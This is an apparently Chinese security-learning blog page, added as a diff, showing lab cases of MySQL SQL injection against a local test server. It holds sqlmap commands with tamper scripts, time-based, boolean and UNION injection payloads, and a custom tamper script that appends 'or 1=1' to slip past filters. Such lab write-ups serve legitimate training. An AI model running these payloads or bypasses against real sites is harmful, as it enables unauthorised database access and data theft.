@@ -1,0 +1,467 @@
+
+
+  <!DOCTYPE html>
+  <html lang="zh-CN" data-default-color-scheme=&#34;dark&#34; >
+  <style>
+    .text1
+    {
+    text-shadow: 0px 0px 2px #f2f3f2;
+    }
+    </style>
+
+  
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/null">
+  <link rel="icon" type="image/png" href="/null">
+  <meta name="viewport"
+        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="description" content="">
+  <meta name="author" content="John Doe">
+  <meta name="keywords" content="">
+  <title>Mysql数据库-sql injection - whale3070&#39;s blog</title>
+
+  <link  rel="stylesheet" href="https://cdn.staticfile.org/twitter-bootstrap/4.5.3/css/bootstrap.min.css" />
+
+
+  <link  rel="stylesheet" href="https://cdn.staticfile.org/github-markdown-css/4.0.0/github-markdown.min.css" />
+  <link  rel="stylesheet" href="/lib/hint/hint.min.css" />
+
+  
+    
+    
+      
+      <link  rel="stylesheet" href="https://cdn.staticfile.org/highlight.js/10.4.0/styles/github-gist.min.css" />
+    
+  
+
+  
+    <link  rel="stylesheet" href="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.css" />
+  
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+<!-- 自定义样式保持在最底部 -->
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    var CONFIG = {"hostname":"192.168.126.129","root":"/","version":"1.8.7","typing":{"enable":false,"typeSpeed":70,"cursorChar":"_","loop":false},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"copy_btn":true,"image_zoom":{"enable":true},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"onlypost":false},"web_analytics":{"enable":false,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null}}};
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+    <body>
+      <header style="height: 70vh;">
+        <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand"
+       href="/">&nbsp;<strong>InfoSec learning</strong>&nbsp;</a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                归档
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                分类
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                标签
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/search/">
+                <i class="iconfont icon-search"></i>
+                搜索
+              </a>
+            </li>
+          
+        
+        
+        
+          
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+          <div class="banner" id="banner" false
+            style="background: url('/img/default.png') no-repeat center center;
+              background-size: cover;">
+              <div class="full-bg-img">
+                <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+                  <div class="page-header text-center fade-in-up">
+                    <span class="h2 text1" id="subtitle" title="Mysql数据库-sql injection">
+                      
+                        Mysql数据库-sql injection
+                      
+                    </span>
+        
+                    
+                      <div class="mt-3">
+  
+  
+    <span class="post-meta">
+      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+      <time datetime="2018-11-22 10:00" pubdate>
+        2018年11月22日 上午
+      </time>
+    </span>
+  
+</div>
+
+<div class="mt-1">
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-chart"></i>
+      1k 字
+    </span>
+  
+
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-clock-fill"></i>
+      
+      
+      15
+       分钟
+    </span>
+  
+
+  
+  
+</div>
+
+                    
+                  </div>
+                    
+                  </div>
+                  
+                </div>
+              </div>
+          </div>
+      </header>
+
+      <main>
+        
+          
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div class="py-5" id="board">
+          <article class="post-content mx-auto" data-pagefind-body>
+            <!-- SEO header -->
+            <h1 style="display: none">Mysql数据库-sql injection</h1>
+            
+            <div class="markdown-body">
+              <p>-查询失败</p>
+<figure class="highlight stylus"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs stylus"><br>说明空格被过滤<br><br>- 添加空格转<span class="hljs-comment">/**/</span>脚本<br>sqlmap -u <span class="hljs-string">&quot;http://192.168.2.131/sqli/example2.php?name=root&quot;</span> <span class="hljs-attr">--tamper</span> space2comment<span class="hljs-selector-class">.py</span> <span class="hljs-attr">--dbs</span><br>扫描失败<br><br>- 指定布尔型注入<br>sqlmap -u <span class="hljs-string">&quot;http://192.168.2.131/sqli/example2.php?name=root&quot;</span> <span class="hljs-attr">--tamper</span>=space2comment<span class="hljs-selector-class">.py</span> -technique B <span class="hljs-attr">--dbms</span> mysql <span class="hljs-attr">--level</span> <span class="hljs-number">5</span><br><br>- 添加一个参数<span class="hljs-attr">--dbms</span> mysql，指定使用的payloads。<br>`sqlmap -u <span class="hljs-string">&quot;http://192.168.2.131/sqli/example2.php?name=root&quot;</span> <span class="hljs-attr">--tamper</span>=space2comment<span class="hljs-selector-class">.py</span> <span class="hljs-attr">--dbms</span> mysql -v`<br><span class="hljs-keyword">for</span> the remaining tests, do you want to include <span class="hljs-attribute">all</span> tests for <span class="hljs-string">&#x27;MySQL&#x27;</span> extending provided level (<span class="hljs-number">1</span>) and risk (<span class="hljs-number">1</span>) values?<br><br></code></pre></div></td></tr></table></figure>
+<p>Parameter: name (GET)<br>    Type: AND&#x2F;OR time-based blind 基于时间的盲注<br>    Title: MySQL &gt;&#x3D; 5.0.12 AND time-based blind<br>    Payload: name&#x3D;root’ AND SLEEP(5) AND ‘WCkk’&#x3D;’WCkk<br>    Vector: AND [RANDNUM]&#x3D;IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM])</p>
+<figure class="highlight jboss-cli"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs jboss-cli"><span class="hljs-comment">#### 删除sqlmap日志</span><br>rm -rf <span class="hljs-string">/root/.sqlmap/output/</span>*<br><br>sqlmap -u <span class="hljs-string">&quot;http://192.168.2.131/sqli/example5.php?id=2&quot;</span> <span class="hljs-params">--dbs</span><br><br><span class="hljs-comment">#### 总结</span><br>sqlmap如果一开始扫描失败，如果需要再次尝试，需要清除一下日志，否则会直接引用历史扫描结果，不会再次扫描。<br><br>如果不指定数据库，或者注入类型，waf过滤的字符，就很容易扫描失败。<br>但这不代表并不存在注入。<br><br><span class="hljs-comment">## 案例三：</span><br><br>![]<span class="hljs-params">(5.PNG)</span><br>经过intruder判断，和上一个案例，多过滤了`%0a`即\n换行符。<br><br>同样用时间盲注。<br>sqlmap -u <span class="hljs-string">&quot;http://192.168.2.131/sqli/example3.php?name=root&quot;</span> <span class="hljs-params">--tamper=space2comment</span>.py <span class="hljs-params">--dbms</span> mysql <span class="hljs-params">--dbs</span><br><br></code></pre></div></td></tr></table></figure>
+<p>Parameter: name (GET)<br>    Type: AND&#x2F;OR time-based blind<br>    Title: MySQL &gt;&#x3D; 5.0.12 AND time-based blind<br>    Payload: name&#x3D;root’ AND SLEEP(5) AND ‘nZha’&#x3D;’nZha</p>
+<figure class="highlight jboss-cli"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs jboss-cli"><span class="hljs-comment">## 案例四：</span><br><br>![]<span class="hljs-params">(6.PNG)</span><br>`http:<span class="hljs-string">//192.168.2.131/sqli/example4.php</span>?id=2`<br>注释被正确解析了，其他都都导致页面查询失败。<br><br>- sqlmap -u <span class="hljs-string">&quot;http://192.168.2.131/sqli/example4.php?id=2&quot;</span> <span class="hljs-params">--dbms</span> mysql <span class="hljs-params">--dbs</span><br><br></code></pre></div></td></tr></table></figure>
+<p>Parameter: id (GET)<br>    Type: boolean-based blind<br>    Title: MySQL &gt;&#x3D; 5.0 boolean-based blind - Parameter replace<br>    Payload: id&#x3D;(SELECT (CASE WHEN (5063&#x3D;5063) THEN 5063 ELSE 5063*(SELECT 5063 FROM INFORMATION_SCHEMA.PLUGINS) END))</p>
+<div class="hljs code-wrapper"><pre><code>Type: AND/OR time-based blind
+Title: MySQL &gt;= 5.0.12 AND time-based blind
+Payload: id=2 AND SLEEP(5)
+
+Type: UNION query
+Title: Generic UNION query (NULL) - 5 columns
+Payload: id=2 UNION ALL SELECT NULL,NULL,CONCAT(0x716b6b6a71,0x6c4e495452554c4e514b6f53784f6c5a6b664e4d53674176646b4d4e4a4f52547850714663686d68,0x71766b7a71),NULL,NULL-- XTiX
+</code></pre></div>
+<figure class="highlight autohotkey"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs autohotkey">## 案例五：<br>和上一个案例差不多。成功解析注释。<br>![](<span class="hljs-number">7</span>.PNG)<br><br><span class="hljs-title">注入类型： Type:</span> <span class="hljs-literal">AND</span>/<span class="hljs-literal">OR</span> time-based blind<br>`sqlmap -u <span class="hljs-string">&quot;http://192.168.2.131/sqli/example5.php?id=2&quot;</span> --dbms mysql --dbs`<br><br>## 案例六：<br><br>![](<span class="hljs-number">8</span>.PNG)<br>%<span class="hljs-number">0</span>a换行符、#注释符被正确解析。<br>错误提示：ERROR INTEGER REQUIRED<br><br>#### **选择与创建tamper脚本**<br>/usr/share/sqlmap/tamper目录下，有很多脚本可以帮助绕过过滤。<br><br>没有找到空格直接转换行符的脚本，于是观察一下空格转注释的脚本。运行sqlmap时候，用wireshark抓包一下。<br>![](<span class="hljs-number">9</span>.PNG)<br><br>![](<span class="hljs-number">10</span>.PNG)<br>确认空格转换为<span class="hljs-comment">/**/</span>，我们可以新建一个脚本，替换一下注释为换行符。<br>`cp space2comment.py space2newline.py`<br>`sed -i &#x27;s/\/\*\*\//%<span class="hljs-number">0</span>a/g&#x27; space2newline.py`<br><br>- `sqlmap -u <span class="hljs-string">&quot;http://192.168.2.131/sqli/example6.php?id=2&quot;</span> --dbms mysql --tamper=space2newline.py --dbs` <br>失败了，于是尝试<br>?id=<span class="hljs-number">2</span><span class="hljs-variable">%0Aand%</span><span class="hljs-number">0</span>A1=<span class="hljs-number">1</span> 一切正常<br>?id=<span class="hljs-number">2</span><span class="hljs-variable">%0Aand%</span><span class="hljs-number">0</span>A1=<span class="hljs-number">2</span> 查询失败<br><br>#### **源代码**<br>黑盒测试不知道过滤条件，做不出了，于是看下源代码。<br><br>下面这条源代码还蛮好懂的，`^$`在正则表达式中，代表开头和结尾。<br><br>`^b`，表示以b开头；`b$`表示以b结尾。<br></code></pre></div></td></tr></table></figure>
+<p>if (!preg_match(‘&#x2F;[0-9]+$&#x2F;‘, $_GET[“id”])) {<br>    die(“ERROR INTEGER REQUIRED”);<br>}</p>
+<figure class="highlight clean"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs clean"><br>#### **重写一个tamper脚本**<br>`sqlmap -u <span class="hljs-string">&quot;http://192.168.2.131/sqli/example6.php?id=2&quot;</span> --dbms mysql --tamper=addTrue.py --dbs` <br><br><br>这次成功了，基于时间的盲注。<br></code></pre></div></td></tr></table></figure>
+<p>Parameter: id (GET)<br>    Type: AND&#x2F;OR time-based blind<br>    Title: MySQL &gt;&#x3D; 5.0.12 AND time-based blind<br>    Payload: id&#x3D;2 AND SLEEP(5)– jExG</p>
+<div class="hljs code-wrapper"><pre><code>Type: UNION query
+Title: Generic UNION query (NULL) - 5 columns
+Payload: id=2 UNION ALL SELECT NULL,NULL,CONCAT(0x71626a7071,0x6c6c5a494a6370686e4a6d5662726c49796e686a7455456745526e48654278634d57426b7467746a,0x7170626271),NULL,NULL-- RmtZ
+</code></pre></div>
+<figure class="highlight autohotkey"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs autohotkey">## `addTrue.py`<br><br></code></pre></div></td></tr></table></figure>
+<p>#coding:utf-8<br>#!&#x2F;usr&#x2F;bin&#x2F;env python</p>
+<p>“””<br>Copyright (c) 2006-2017 sqlmap developers (<a target="_blank" rel="noopener" href="http://sqlmap.org/">http://sqlmap.org/</a>)<br>See the file ‘doc&#x2F;COPYING’ for copying permission<br>“””</p>
+<p>from lib.core.enums import PRIORITY</p>
+<p><strong>priority</strong> &#x3D; PRIORITY.LOW</p>
+<p>def dependencies():<br>    pass</p>
+<p>def tamper(payload, **kwargs):<br>    “””<br>    Notes:<br>        * Useful to bypass weak and bespoke web application firewalls</p>
+<div class="hljs code-wrapper"><pre><code>&gt;&gt;&gt; tamper(&#39;SELECT id FROM users&#39;)
+&#39;SELECT id FROM users or 1=1&#39;
+&quot;&quot;&quot;
+
+retVal = payload
+
+if payload:
+    retVal = payload+ &quot; or 1=1&quot;
+
+return retVal
+</code></pre></div>
+<div class="hljs code-wrapper"><pre><code>
+</code></pre></div>
+
+            </div>
+            <hr>
+            <div>
+              <div class="post-metas mb-3">
+                
+                
+              </div>
+              
+                
+              
+              
+                <div class="post-prevnext">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2018/12/02/33208.html">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">SolidState(**Java Apache Mail server命令执行**)</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2018/11/18/45160.html">
+                        <span class="hidden-mobile">常见web漏洞-command execution</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+      </div>
+    
+  </div>
+</div>
+
+<!-- Custom -->
+
+
+            
+
+                
+                  <a id="scroll-top-button" href="#" role="button">
+                    <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+                  </a>
+                  
+
+                    
+
+                          
+      </main>
+
+      <footer class="text-center mt-5 py-3">
+  <div class="footer-content">
+     <a href="https://whale3070.github.io/" target="_blank" rel="nofollow noopener"><span>Whale3070</span></a> 
+  </div>
+  
+  <div class="statistics">
+    
+    
+
+    
+      
+        <!-- 不蒜子统计PV -->
+        <span id="busuanzi_container_site_pv" style="display: none">
+            总访问量 
+            <span id="busuanzi_value_site_pv"></span>
+             次
+          </span>
+      
+      
+        <!-- 不蒜子统计UV -->
+        <span id="busuanzi_container_site_uv" style="display: none">
+            总访客数 
+            <span id="busuanzi_value_site_uv"></span>
+             人
+          </span>
+      
+    
+  </div>
+
+
+  
+
+  
+</footer>
+
+<!-- SCRIPTS -->
+
+  <script  src="https://cdn.staticfile.org/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://cdn.staticfile.org/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://cdn.staticfile.org/jquery/3.5.1/jquery.min.js" ></script>
+<script  src="https://cdn.staticfile.org/twitter-bootstrap/4.5.3/js/bootstrap.min.js" ></script>
+<script  src="/js/debouncer.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+<!-- Plugins -->
+
+
+  
+    <script  src="/js/lazyload.js" ></script>
+  
+
+
+
+  
+
+
+
+  <script  src="https://cdn.staticfile.org/tocbot/4.12.0/tocbot.min.js" ></script>
+
+
+
+  <script  src="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.js" ></script>
+
+
+
+  <script  src="https://cdn.staticfile.org/anchor-js/4.3.0/anchor.min.js" ></script>
+
+
+
+  <script defer src="https://cdn.staticfile.org/clipboard.js/2.0.6/clipboard.min.js" ></script>
+
+
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<!-- 主题的启动项 保持在最底部 -->
+<script  src="/js/boot.js" ></script>
+
+
+<link href="/pagefind/pagefind-ui.css" rel="stylesheet">
+  <script src="/pagefind/pagefind-ui.js"></script>
+  <style>
+    /* 搜索框配色适配 */
+    #search { margin-top: 2rem; }
+    [data-user-color-scheme='dark'] .pagefind-ui {
+      --pagefind-ui-primary: #eeeeee;
+      --pagefind-ui-text: #eeeeee;
+      --pagefind-ui-background: #151515;
+      --pagefind-ui-border: #333;
+    }
+  </style>
+    </body>
+
+  </html>
